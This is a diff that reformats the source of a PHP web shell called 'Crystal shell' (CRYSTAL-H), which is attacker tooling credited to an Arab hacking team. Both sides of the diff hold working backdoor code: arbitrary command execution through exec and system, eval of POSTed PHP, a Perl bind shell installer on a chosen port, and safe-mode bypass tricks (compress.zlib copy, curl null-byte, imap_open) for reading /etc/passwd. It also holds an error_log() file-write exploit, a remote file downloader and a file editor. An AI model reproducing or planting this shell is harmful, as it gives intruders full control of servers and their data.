@@ -1,5 +1,5 @@
 
-<?
+<?php
 
 
 
@@ -73,45 +73,58 @@ Crystal shell</title>
 <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
 <p align="center">
 	<b>
-	<?
-	$dirfile="$file_to_download";
-if (file_exists("$dirfile"))
-{
-header("location: $dirfile");
+	<?php
+    $dirfile="$file_to_download";
+if (file_exists("$dirfile")) {
+    header("location: $dirfile");
 }
-if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
-{
- $safemode = true;
- $hsafemode = "<font color=\"red\">ON (secure)</font>";
-
-
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
+    $safemode = true;
+    $hsafemode = "<font color=\"red\">ON (secure)</font>";
+} else {
+    $safemode = false;
+    $hsafemode = "<font color=\"green\">OFF (not secure)</font>";
 }
-
-else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
 echo("Safe-mode: $hsafemode");
 // PHPINFO
 if ($_GET['action'] == "phpinfo") {
-	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() b&#7883; c&#7845;m";
-	exit;
+    echo $phpinfo=(!eregi("phpinfo", $dis_func)) ? phpinfo() : "phpinfo() b&#7883; c&#7845;m";
+    exit;
 }
 $v = @ini_get("open_basedir");
-if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
-else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
+if ($v or strtolower($v) == "on") {
+    $openbasedir = true;
+    $hopenbasedir = "<font color=\"red\">".$v."</font>";
+} else {
+    $openbasedir = false;
+    $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";
+}
 echo("<br>");
 echo("Open base dir: $hopenbasedir");
 echo("<br>");
 echo "PostgreSQL: <b>";
 $pg_on = @function_exists('pg_connect');
-if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
+if ($pg_on) {
+    echo "<font color=green>ON</font></b>";
+} else {
+    echo "<font color=red>OFF</font></b>";
+}
 echo("<br>");
 echo "MSSQL: <b>";
 $mssql_on = @function_exists('mssql_connect');
-if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
+if ($mssql_on) {
+    echo "<font color=green>ON</font></b>";
+} else {
+    echo "<font color=red>OFF</font></b>";
+}
 echo("<br>");
 echo "MySQL: <b>";
 $mysql_on = @function_exists('mysql_connect');
-if($mysql_on){
-echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
+if ($mysql_on) {
+    echo "<font color=green>ON</font></b>";
+} else {
+    echo "<font color=red>OFF</font></b>";
+}
 echo("<br>");
 echo "PHP version: <b>".@phpversion()."</b>";
 echo("<br>");
@@ -119,13 +132,21 @@ echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font colo
 
 echo("<br>");
 echo "Disable functions : <b>";
-if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
+if (''==($df=@ini_get('disable_functions'))) {
+    echo "<font color=green>NONE</font></b>";
+} else {
+    echo "<font color=red>$df</font></b>";
+}
 $free = @diskfreespace($dir);
-if (!$free) {$free = 0;}
+if (!$free) {
+    $free = 0;
+}
 $all = @disk_total_space($dir);
-if (!$all) {$all = 0;}
+if (!$all) {
+    $all = 0;
+}
 $used = $all-$free;
-$used_percent = @round(100/($all/$free),2);
+$used_percent = @round(100/($all/$free), 2);
 
 ?>
 </b></p>
@@ -159,10 +180,10 @@ $used_percent = @round(100/($all/$free),2);
 	</font>
 	<a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none">
 <font size=-2 face=verdana color="#FFFFFF">
-<? passthru("id");?></font><font size=-2 face=verdana color="black"><br>
+<?php passthru("id");?></font><font size=-2 face=verdana color="black"><br>
 	</font>
 </a><span lang="en-us"><font face="Wingdings" size="3" color="#FFFFFF">1</font></span><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><font size="-2" face="verdana"><font size=-2 face=Verdana color="#DCE7EF">:</font><font size=-2 face=verdana color="#DCE7EF">
-<? echo getcwd();?></div></font></font></a></font></b></a></font><br>
+<?php echo getcwd();?></div></font></font></a></font></b></a></font><br>
 
 <br>&nbsp;<b><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px"><font color="#FF0000" face="Verdana" size="-2">
 </font></font><font color="#FF0000" face="Verdana" size="2">
@@ -254,27 +275,29 @@ port
 	</font>
 	</b>
 </font></p></td></tr></table>
-<?
-if ($act == "help") {echo "<center><b>«·”·«„ ⁄·Ìﬂ„ Ê—Õ„… «··Â Ê»—ﬂ« Â<br><br>⁄“Ì“Ì «·„” Œœ„<br>«–« «—œ  «·„”«⁄œ… «÷€ÿ ⁄·Ï «”„ «·ŒÌ«— «·„Ê÷Õ »«··Ê‰ «·«“—ﬁ<br>Ê” ŸÂ— ·ﬂ „⁄·Ê„«  «·ŒÌ«—   </a>.</b>";}
-if ($act == "bindport"){
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+<?php
+if ($act == "help") {
+    echo "<center><b>«·”·«„ ⁄·Ìﬂ„ Ê—Õ„… «··Â Ê»—ﬂ« Â<br><br>⁄“Ì“Ì «·„” Œœ„<br>«–« «—œ  «·„”«⁄œ… «÷€ÿ ⁄·Ï «”„ «·ŒÌ«— «·„Ê÷Õ »«··Ê‰ «·«“—ﬁ<br>Ê” ŸÂ— ·ﬂ „⁄·Ê„«  «·ŒÌ«—   </a>.</b>";
+}
+if ($act == "bindport") {
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 <b>/bin/bash</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\">
 <b>Port</b><input type=\"text\" name=\"port\" value=\"3333\">
 <INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
 <INPUT type=\"submit\" value=\"Connect\"></form></div>";
 }
-if ($act == "tools"){
-	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+if ($act == "tools") {
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 File to edit:
 <input type=\"text\" name=\"editfile\" >
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
 <INPUT type=\"submit\" value=\"Edit\"></form></div>";
- echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 <table id=tb><tr><td>
 <INPUT type=\"hidden\" name=\"php\" value=\"yes\">
 <INPUT type=\"submit\" value=\"eval code\" id=input></form></div></td></table>";
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>Download here <b>from</b>:
 <INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
 <b>-->>:</b>
@@ -282,60 +305,68 @@ echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/for
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\"></td><td>
 <INPUT type=\"submit\" value=\"Download\" id=input></td></tr></table></form></div>";
 }
-if ($act == "about") {echo "<center><b>Coding by:<br><br>Super-Crystal<br>&<br>Mohajer22<br>-----<br>Thanks <br>TrYaG Team <br> ArabSecurityCenter Team <br>CRYSTAL-H Version:0 Beta phpshell code<br>Saudi Arabic  </a>.</b>";}
+if ($act == "about") {
+    echo "<center><b>Coding by:<br><br>Super-Crystal<br>&<br>Mohajer22<br>-----<br>Thanks <br>TrYaG Team <br> ArabSecurityCenter Team <br>CRYSTAL-H Version:0 Beta phpshell code<br>Saudi Arabic  </a>.</b>";
+}
 
-if ($act == "bind") {echo "<center><b>CRYSTAL-H:<br><br>-Connect ﬁ„ »«·÷€ÿ ⁄·Ï ŒÌ«—.<br>.- »⁄œ „«Ì „ «‰“«· «·”ﬂ—Ì»  »«·„Ã·œ<br>.- ÊÃÂ ·«œ«… «·‰  ﬂ«  Ê ’‰  ⁄·Ï<br>nc -lp 3333»ﬂ «»… «·„‰›– - <br>«·”ﬂ—Ì»  »·€… «·»Ì—· <br>Bind port to  :<br> bind shell ÊÂ‰Ì∆«  ·ﬂ   </a>.</b>";}
+if ($act == "bind") {
+    echo "<center><b>CRYSTAL-H:<br><br>-Connect ﬁ„ »«·÷€ÿ ⁄·Ï ŒÌ«—.<br>.- »⁄œ „«Ì „ «‰“«· «·”ﬂ—Ì»  »«·„Ã·œ<br>.- ÊÃÂ ·«œ«… «·‰  ﬂ«  Ê ’‰  ⁄·Ï<br>nc -lp 3333»ﬂ «»… «·„‰›– - <br>«·”ﬂ—Ì»  »·€… «·»Ì—· <br>Bind port to  :<br> bind shell ÊÂ‰Ì∆«  ·ﬂ   </a>.</b>";
+}
 
-if ($act == "command") {echo "<center><b>CRYSTAL-H:<br><br>·√Œ Ì«— «·«Ê«„— «·Ã«Â“Â  Select ------ x  «÷€ÿ ⁄·Ï «·ŒÌ«—<br>.- Ê«–« «—œ  ﬂ «»Â  «·«Ê«„— »‰›”ﬂ ﬁœ  ﬂ ›Ì »«·ŒÌ«—<br>Command   </a>.</b>";}
+if ($act == "command") {
+    echo "<center><b>CRYSTAL-H:<br><br>·√Œ Ì«— «·«Ê«„— «·Ã«Â“Â  Select ------ x  «÷€ÿ ⁄·Ï «·ŒÌ«—<br>.- Ê«–« «—œ  ﬂ «»Â  «·«Ê«„— »‰›”ﬂ ﬁœ  ﬂ ›Ì »«·ŒÌ«—<br>Command   </a>.</b>";
+}
 
-if ($act == "team") {echo "<center><b>Arab Security Center Team<br><br>Super-Crystal<br>Medo-HaCKer<br>Anaconda<br>Alsb0r<br> ReeM-HaCK <br>NoOFa <br> AL-Alame<br>The YounG HackeR<br>Anti-Hack<br>Thanks  </a>.</b>";}
+if ($act == "team") {
+    echo "<center><b>Arab Security Center Team<br><br>Super-Crystal<br>Medo-HaCKer<br>Anaconda<br>Alsb0r<br> ReeM-HaCK <br>NoOFa <br> AL-Alame<br>The YounG HackeR<br>Anti-Hack<br>Thanks  </a>.</b>";
+}
 if (array_key_exists('image', $_GET)) {
-	header('Content-Type: image/gif');
-	die(getimage($_GET['image']));
+    header('Content-Type: image/gif');
+    die(getimage($_GET['image']));
 }
 
 if ($act == "bypass") {
-echo "
+    echo "
 <form action=\"$REQUEST_URI\" method=\"POST\">
 <table id=tb><tr><td>Execute:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\"></td></tr></table>
 ";
-echo ("<FONT COLOR=\"RED\"> bypass safemode with copy </FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+    echo("<FONT COLOR=\"RED\"> bypass safemode with copy </FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>read file :
 <INPUT type=\"text\" name=\"copy\" size=30 value=\"/etc/passwd\">
 <INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
-echo ("<FONT COLOR=\"RED\"> bypass safemode with CuRl</FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+    echo("<FONT COLOR=\"RED\"> bypass safemode with CuRl</FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>read file :
 <INPUT type=\"text\" name=\"curl\" size=30 value=\"/etc/passwd\">
 <INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
-echo ("<FONT COLOR=\"RED\"> bypass safemode with imap()</FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+    echo("<FONT COLOR=\"RED\"> bypass safemode with imap()</FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td><select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>
 <INPUT type=\"text\" name=\"string\" size=30 value=\"/etc/passwd\">
 <INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
-echo ("<FONT COLOR=\"RED\"> bypass safemode with id()</FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+    echo("<FONT COLOR=\"RED\"> bypass safemode with id()</FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>
 <select name=plugin><option>cat /etc/passwd</option></select>
 <INPUT type=\"submit\" value=\"Show\" id=input></td></tr></table></form></div>";
-echo ("<FONT COLOR=\"RED\"> Exploit: error_log()</FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+    echo("<FONT COLOR=\"RED\"> Exploit: error_log()</FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>
 <INPUT type=\"text\" name=\"ERORR\" size=30 value=\"\">
 <INPUT type=\"submit\" value=\"Write\" id=input></td></tr></table></form></div>";
 }
-if ($act == "decoder"){
-echo ("<FONT COLOR=\"RED\"> replace Chr()</FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+if ($act == "decoder") {
+    echo("<FONT COLOR=\"RED\"> replace Chr()</FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>
 <textarea name=\"Mohajer22\" cols=\"50\" rows=\"15\" wrar=\"off\">
 </textarea><br>
 <INPUT type=\"submit\" value=\"Replace\" id=input></td></tr></table></form></div>";
 }
-if ($act == "SQL"){
-echo ("<FONT COLOR=\"RED\">   MySQL    </FONT>");
-echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+if ($act == "SQL") {
+    echo("<FONT COLOR=\"RED\">   MySQL    </FONT>");
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td> Username :
 <INPUT type=\"text\" name=\"username\" size=30 value=\"\">\n
 password :
@@ -360,22 +391,22 @@ password :
 			<td style="font-size: 13px; font-family: verdana, arial, helvetica; color: red; background-color: #0000000">
 <?php
 // chr() //
-if(empty($_POST['Mohajer22'])){
+if (empty($_POST['Mohajer22'])) {
 } else {
-$m=$_POST['Mohajer22'];
-$m=str_replace(" ","",$m);
-$m=str_replace("(","",$m);
-$m=str_replace(")","",$m);
-$m=str_replace(".",";",$m);
-$m=str_replace("chr","&#",$m);
-$m=str_replace(" ","",$m);
-echo $m ;
+    $m=$_POST['Mohajer22'];
+    $m=str_replace(" ", "", $m);
+    $m=str_replace("(", "", $m);
+    $m=str_replace(")", "", $m);
+    $m=str_replace(".", ";", $m);
+    $m=str_replace("chr", "&#", $m);
+    $m=str_replace(" ", "", $m);
+    echo $m ;
 }
 // ERORR //
-if(empty($_POST['ERORR'])){
+if (empty($_POST['ERORR'])) {
 } else {
-$ERORR=$_POST['ERORR'];
-echo  error_log("
+    $ERORR=$_POST['ERORR'];
+    echo  error_log("
 <html>
 <head>
 <title> Exploit: error_log() By * Super-Crystal  * </title>
@@ -426,84 +457,86 @@ if(empty(\$_POST['cmd'])){
 <input type='submit' value='  run  '>
 <input type='reset' value=' reset '>
 </form>
-", 3,$ERORR);
+", 3, $ERORR);
 }
 // id //
-if ($_POST['plugin'] ){
-
-
-                                  switch($_POST['plugin']){
+if ($_POST['plugin']) {
+    switch ($_POST['plugin']) {
                                  case("cat /etc/passwd"):
-                                           for($uid=0;$uid<6000;$uid++){   //cat /etc/passwd
-                                        $ara = posix_getpwuid($uid);
-                                                if (!empty($ara)) {
-                                                  while (list ($key, $val) = each($ara)){
-                                                    print "$val:";
-                                                  }
-                                                  print "<br>";
-                                                }
-                                        }
+                                           for ($uid=0;$uid<6000;$uid++) {   //cat /etc/passwd
+                                               $ara = posix_getpwuid($uid);
+                                               if (!empty($ara)) {
+                                                   while (list($key, $val) = each($ara)) {
+                                                       print "$val:";
+                                                   }
+                                                   print "<br>";
+                                               }
+                                           }
 
                                 break;
 
 
                                                 }
-                                               }
+}
 
 // imap //
 $string = !empty($_POST['string']) ? $_POST['string'] : 0;
 $switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;
 
 if ($string && $switch == "file") {
-$stream = imap_open($string, "", "");
+    $stream = imap_open($string, "", "");
 
-$str = imap_body($stream, 1);
-if (!empty($str))
-echo "<pre>".$str."</pre>";
-imap_close($stream);
+    $str = imap_body($stream, 1);
+    if (!empty($str)) {
+        echo "<pre>".$str."</pre>";
+    }
+    imap_close($stream);
 } elseif ($string && $switch == "dir") {
-$stream = imap_open("/etc/passwd", "", "");
-if ($stream == FALSE)
-die("Can't open imap stream");
-$string = explode("|",$string);
-if (count($string) > 1)
-$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
-else
-$dir_list = imap_list($stream, trim($string[0]), "*");
-echo "<pre>";
-for ($i = 0; $i < count($dir_list); $i++)
-echo "$dir_list[$i]"."<p>&nbsp;</p>" ;
-echo "</pre>";
-imap_close($stream);
+    $stream = imap_open("/etc/passwd", "", "");
+    if ($stream == false) {
+        die("Can't open imap stream");
+    }
+    $string = explode("|", $string);
+    if (count($string) > 1) {
+        $dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
+    } else {
+        $dir_list = imap_list($stream, trim($string[0]), "*");
+    }
+    echo "<pre>";
+    for ($i = 0; $i < count($dir_list); $i++) {
+        echo "$dir_list[$i]"."<p>&nbsp;</p>" ;
+    }
+    echo "</pre>";
+    imap_close($stream);
 }
 // CURL //
-if(empty($_POST['curl'])){
+if (empty($_POST['curl'])) {
 } else {
-$m=$_POST['curl'];
-$ch =
+    $m=$_POST['curl'];
+    $ch =
 curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
-curl_exec($ch);
-var_dump(curl_exec($ch));
+    curl_exec($ch);
+    var_dump(curl_exec($ch));
 }
 
 // copy//
 $u1p="";
 $tymczas="";
-if(empty($_POST['copy'])){
+if (empty($_POST['copy'])) {
 } else {
-$u1p=$_POST['copy'];
-$temp=tempnam($tymczas, "cx");
-if(copy("compress.zlib://".$u1p, $temp)){
-$zrodlo = fopen($temp, "r");
-$tekst = fread($zrodlo, filesize($temp));
-fclose($zrodlo);
-echo "".htmlspecialchars($tekst)."";
-unlink($temp);
-} else {
-die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
+    $u1p=$_POST['copy'];
+    $temp=tempnam($tymczas, "cx");
+    if (copy("compress.zlib://".$u1p, $temp)) {
+        $zrodlo = fopen($temp, "r");
+        $tekst = fread($zrodlo, filesize($temp));
+        fclose($zrodlo);
+        echo "".htmlspecialchars($tekst)."";
+        unlink($temp);
+    } else {
+        die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
 <B>".htmlspecialchars($u1p)."</B> dosen't exists or you don't have
 access.</CENTER></FONT>");
-}
+    }
 }
 
 @$dir = $_POST['dir'];
@@ -518,8 +551,8 @@ $files = '';
 
 
 
-if (isset($_POST['port'])){
-$bind = "
+if (isset($_POST['port'])) {
+    $bind = "
 #!/usr/bin/perl
 
 \$port = {$_POST['port']};
@@ -545,77 +578,76 @@ while(1)
 	}
 	close X;
 }
-";}
+";
+}
 
-function decode($buffer){
-
-return  convert_cyr_string ($buffer, 'd', 'w');
-
+function decode($buffer)
+{
+    return  convert_cyr_string($buffer, 'd', 'w');
 }
 
 
 
 function execute($com)
 {
-
- if (!empty($com))
- {
-  if(function_exists('exec'))
-   {
-    exec($com,$arr);
-   echo implode('
-',$arr);
-   }
-  elseif(function_exists('shell_exec'))
-   {
-    echo shell_exec($com);
-
-
-   }
-  elseif(function_exists('system'))
-{
-
-    echo system($com);
-}
-  elseif(function_exists('passthru'))
-   {
-
-    echo passthru($com);
-
-   }
-}
-
+    if (!empty($com)) {
+        if (function_exists('exec')) {
+            exec($com, $arr);
+            echo implode('
+', $arr);
+        } elseif (function_exists('shell_exec')) {
+            echo shell_exec($com);
+        } elseif (function_exists('system')) {
+            echo system($com);
+        } elseif (function_exists('passthru')) {
+            echo passthru($com);
+        }
+    }
 }
 
 
 function perms($mode)
 {
-
-if( $mode & 0x1000 ) { $type='p'; }
-else if( $mode & 0x2000 ) { $type='c'; }
-else if( $mode & 0x4000 ) { $type='d'; }
-else if( $mode & 0x6000 ) { $type='b'; }
-else if( $mode & 0x8000 ) { $type='-'; }
-else if( $mode & 0xA000 ) { $type='l'; }
-else if( $mode & 0xC000 ) { $type='s'; }
-else $type='u';
-$owner["read"] = ($mode & 00400) ? 'r' : '-';
-$owner["write"] = ($mode & 00200) ? 'w' : '-';
-$owner["execute"] = ($mode & 00100) ? 'x' : '-';
-$group["read"] = ($mode & 00040) ? 'r' : '-';
-$group["write"] = ($mode & 00020) ? 'w' : '-';
-$group["execute"] = ($mode & 00010) ? 'x' : '-';
-$world["read"] = ($mode & 00004) ? 'r' : '-';
-$world["write"] = ($mode & 00002) ? 'w' : '-';
-$world["execute"] = ($mode & 00001) ? 'x' : '-';
-if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
-if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
-if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
-$s=sprintf("%1s", $type);
-$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
-$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
-$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
-return trim($s);
+    if ($mode & 0x1000) {
+        $type='p';
+    } elseif ($mode & 0x2000) {
+        $type='c';
+    } elseif ($mode & 0x4000) {
+        $type='d';
+    } elseif ($mode & 0x6000) {
+        $type='b';
+    } elseif ($mode & 0x8000) {
+        $type='-';
+    } elseif ($mode & 0xA000) {
+        $type='l';
+    } elseif ($mode & 0xC000) {
+        $type='s';
+    } else {
+        $type='u';
+    }
+    $owner["read"] = ($mode & 00400) ? 'r' : '-';
+    $owner["write"] = ($mode & 00200) ? 'w' : '-';
+    $owner["execute"] = ($mode & 00100) ? 'x' : '-';
+    $group["read"] = ($mode & 00040) ? 'r' : '-';
+    $group["write"] = ($mode & 00020) ? 'w' : '-';
+    $group["execute"] = ($mode & 00010) ? 'x' : '-';
+    $world["read"] = ($mode & 00004) ? 'r' : '-';
+    $world["write"] = ($mode & 00002) ? 'w' : '-';
+    $world["execute"] = ($mode & 00001) ? 'x' : '-';
+    if ($mode & 0x800) {
+        $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
+    }
+    if ($mode & 0x400) {
+        $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
+    }
+    if ($mode & 0x200) {
+        $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
+    }
+    $s=sprintf("%1s", $type);
+    $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
+    $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
+    $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
+    return trim($s);
 }
 
 
@@ -623,122 +655,105 @@ return trim($s);
 
 
 
-if(isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "")
-{
-copy($HTTP_POST_FILES["userfile"]["tmp_name"],$HTTP_POST_FILES["userfile"]["name"]);
+if (isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "") {
+    copy($HTTP_POST_FILES["userfile"]["tmp_name"], $HTTP_POST_FILES["userfile"]["name"]);
 }
 
-if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))
-
-{
-$data = implode("", file($_POST['filefrom']));
-$fp = fopen($_POST['fileto'], "wb");
-fputs($fp, $data);
-$ok = fclose($fp);
-if($ok)
-{
-$size = filesize($_POST['fileto'])/1024;
-$sizef = sprintf("%.2f", $size);
-print "<center><div id=logostrip>Download - OK. (".$sizef."??)</div></center>";
-}
-else
-{
-print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
-}
+if ((isset($_POST['fileto']))||(isset($_POST['filefrom']))) {
+    $data = implode("", file($_POST['filefrom']));
+    $fp = fopen($_POST['fileto'], "wb");
+    fputs($fp, $data);
+    $ok = fclose($fp);
+    if ($ok) {
+        $size = filesize($_POST['fileto'])/1024;
+        $sizef = sprintf("%.2f", $size);
+        print "<center><div id=logostrip>Download - OK. (".$sizef."??)</div></center>";
+    } else {
+        print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
+    }
 }
 
-if (isset($_POST['installbind'])){
-
-if (is_dir($_POST['installpath']) == true){
-chdir($_POST['installpath']);
-$_POST['installpath'] = "temp.pl";}
-
-
-$fp = fopen($_POST['installpath'], "w");
-fwrite($fp, $bind);
-fclose($fp);
-
-exec("perl " . $_POST['installpath']);
-chdir($dir);
+if (isset($_POST['installbind'])) {
+    if (is_dir($_POST['installpath']) == true) {
+        chdir($_POST['installpath']);
+        $_POST['installpath'] = "temp.pl";
+    }
 
 
+    $fp = fopen($_POST['installpath'], "w");
+    fwrite($fp, $bind);
+    fclose($fp);
+
+    exec("perl " . $_POST['installpath']);
+    chdir($dir);
 }
 
 
 @$ef = stripslashes($_POST['editfile']);
-if ($ef){
-$fp = fopen($ef, "r");
-$filearr = file($ef);
+if ($ef) {
+    $fp = fopen($ef, "r");
+    $filearr = file($ef);
 
 
 
-$string = '';
-$content = '';
-foreach ($filearr as $string){
-$string = str_replace("<" , "&lt;" , $string);
-$string = str_replace(">" , "&gt;" , $string);
-$content = $content . $string;
-}
+    $string = '';
+    $content = '';
+    foreach ($filearr as $string) {
+        $string = str_replace("<", "&lt;", $string);
+        $string = str_replace(">", "&gt;", $string);
+        $content = $content . $string;
+    }
 
-echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
+    echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
 <input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
 <input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
 <input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>";
-fclose($fp);
+    fclose($fp);
 }
 
-if(isset($_POST['savefile'])){
-
-$fp = fopen($_POST['savefile'], "w");
-$content = stripslashes($content);
-fwrite($fp, $content);
-fclose($fp);
-echo "<center><div id=logostrip>saved -OK!</div></center>";
-
+if (isset($_POST['savefile'])) {
+    $fp = fopen($_POST['savefile'], "w");
+    $content = stripslashes($content);
+    fwrite($fp, $content);
+    fclose($fp);
+    echo "<center><div id=logostrip>saved -OK!</div></center>";
 }
 
 
-if (isset($_POST['php'])){
-
-echo "<center><div id=logostrip>eval code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
+if (isset($_POST['php'])) {
+    echo "<center><div id=logostrip>eval code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
 <input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>";
 }
 
 
 
-if(isset($_POST['phpcode'])){
-
-echo "<center><div id=logostrip>Results of PHP execution<br><br>";
-@eval(stripslashes($_POST['phpcode']));
-echo "</div></center>";
-
-
+if (isset($_POST['phpcode'])) {
+    echo "<center><div id=logostrip>Results of PHP execution<br><br>";
+    @eval(stripslashes($_POST['phpcode']));
+    echo "</div></center>";
 }
 
 
-if ($cmd){
+if ($cmd) {
+    if ($sertype == "winda") {
+        ob_start();
+        execute($cmd);
+        $buffer = "";
+        $buffer = ob_get_contents();
+        ob_end_clean();
+    } else {
+        ob_start();
+        echo decode(execute($cmd));
+        $buffer = "";
+        $buffer = ob_get_contents();
+        ob_end_clean();
+    }
 
-if($sertype == "winda"){
-ob_start();
-execute($cmd);
-$buffer = "";
-$buffer = ob_get_contents();
-ob_end_clean();
-}
-else{
-ob_start();
-echo decode(execute($cmd));
-$buffer = "";
-$buffer = ob_get_contents();
-ob_end_clean();
-}
-
-if (trim($buffer)){
-echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
-echo decode($buffer);
-echo "</textarea></center></div>";
-}
-
+    if (trim($buffer)) {
+        echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
+        echo decode($buffer);
+        echo "</textarea></center></div>";
+    }
 }
 $arr = array();
 
@@ -750,50 +765,41 @@ sort($arr);
 echo "<table><tr><td>Name</td><td><a title=\"Type of object\">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title=\"If Yes, you have write permission\">Write</a></td><td><a title=\"If Yes, you have read permission\">Read</a></td></tr>";
 
 foreach ($arr as $filename) {
+    if ($filename != "." and $filename != "..") {
+        if (is_dir($filename) == true) {
+            $directory = "";
